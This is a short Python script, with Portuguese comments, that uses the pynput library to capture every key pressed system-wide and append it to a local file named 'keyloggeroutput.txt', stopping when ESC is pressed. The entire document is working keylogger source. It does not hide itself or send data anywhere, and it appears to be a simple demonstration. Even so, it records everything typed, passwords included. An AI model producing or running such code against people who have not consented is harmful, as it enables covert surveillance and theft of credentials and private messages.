from pynput import keyboard

log_file = "keyloggeroutput.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

def on_release(key):
    # Para quando a tecla ESC for pressionada
    if key == keyboard.Key.esc:
        return False  # Isso encerra o listener

# Configura o listener para capturar as teclas pressionadas
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
